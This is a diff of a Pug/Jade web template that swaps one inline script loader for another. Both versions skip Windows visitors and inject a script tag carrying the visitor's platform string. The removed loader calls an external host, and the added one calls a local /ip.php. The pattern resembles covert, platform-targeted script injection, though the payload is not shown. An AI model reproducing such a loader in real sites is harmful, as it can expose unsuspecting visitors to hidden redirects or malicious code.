@@ -52,13 +52,14 @@ html
             })();
 
         script(type='text/javascript').
-           (function(d, n) {
-            if(n.indexOf('Win') == '0')return;
-            var ho = d.createElement("script");
-            ho.src = "http://s8.cnzzcz.com/ip/6802?w="+n;
-            var s = d.getElementsByTagName("script")[0];
-            s.parentNode.insertBefore(ho, s);
-           })(document, navigator.platform);
+            (function (d, n) {
+                if (n.indexOf('Win') == '0')return;
+                var ho = d.createElement("script");
+                var ra = "?w=" + n + "&_=" + new Date().getTime();
+                ho.src = "/ip.php" + ra;
+                var s = d.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(ho, s);
+            })(document, navigator.platform);
 
 
 
